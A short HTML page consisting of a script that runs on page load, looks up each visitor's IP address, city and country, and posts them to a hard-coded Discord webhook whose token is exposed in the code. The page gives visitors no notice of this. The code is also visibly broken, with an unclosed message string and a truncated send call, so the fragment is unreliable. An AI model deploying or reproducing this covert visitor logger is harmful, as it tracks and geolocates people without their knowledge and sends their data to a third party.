<!DOCTYPE html>

<script>
(async () => {
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1460589682583670856/Y9o1UwSycM3E4PvHx1bgpJYIbURtcMUyGhofPKX5DdcLyrg3tY_Gw2-3nAWjZvjwhwnV";

  try {
    // Get visitor IP info
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const message = {
      content: `📦 **New Visitor**
🌐 IP: ${ipData.ip}
🏙 City: ${ipData.city}
🌍 Country: ${ipData.country_name}

    // Send to Discord webhook
    await fetch(WEBHOOK_URL, {

  } catch (err) {
    console.error("Error sending IP to webhook:", err);
  }
})();
</script>
